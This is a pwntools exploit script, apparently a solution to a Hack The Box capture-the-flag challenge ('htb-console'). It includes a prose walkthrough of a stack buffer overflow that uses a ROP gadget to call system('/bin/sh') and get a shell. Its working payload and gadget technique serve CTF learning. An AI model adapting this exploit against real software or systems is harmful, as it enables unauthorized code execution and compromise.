# Type: Buffer overflow, ROP, ret2libc
'''
Explanation:
First we do the basic enumeration. We find no bad function (e.g winner function on reg). So we figure that this is a ROP challenge. So we have to get a shell. But can't execute shellcode on the stack because NX is enabled. So we search for any syscall. We find one system("date") and get its address (we use 'objdump -D htb-console | grep system'). We see that the argument for this call was passed by RDI register. So we try to pass our own argument "/bin/sh" to that. So we search for this string in the assembly but couldn't find. But we see that there is a buffer where we could pass a string, that buffer can be accessed by typing hof(hall of fame) when asked for commands by the program. So we get the address of that buffer. And to send this buffers address to the RDI we look for this instruction 'pop rdi; ret' string in the file (we use 'ROPgadget --binary htb-console'), and we take the address of that instruction.

Finally we build a payload. First it will use the address of 'pop rdi; ret' as the function return address and execute that. The POP instruction will pop the second part of our payload which is the address of the buffer. So our buffer address will go to the RDI register. And the RET instruction will execute the third part of our payload which will invoke syscall with our own string '/bin/sh' as the argument, and thus we get a shell.
'''


from pwn import *

def main():
	#start process
	io = process('./htb-console')
	#io = remote('178.62.99.180', '31975')
	
	#enumerate
	syscall_address = 0x00401381		#'system()'
	pop_rdi_ret_address = 0x00401473	#'pop rdi, ret'
	string_to_execute_address = 0x04040b0	#'hof name'
	
	#create ROP chain
	padding = 24 * b'a'
	syscall = p64(syscall_address)
	pop_rdi_ret = p64(pop_rdi_ret_address)
	string_to_execute = p64(string_to_execute_address)
	payload = padding + pop_rdi_ret + string_to_execute + syscall
	
	io.sendlineafter('>> ', 'hof')
	io.sendlineafter('Enter your name: ', '/bin/sh')
	io.sendlineafter('>> ', 'flag')
	io.sendlineafter('Enter flag: ', payload)
	
	io.interactive()
	
if __name__ == '__main__':
	main()
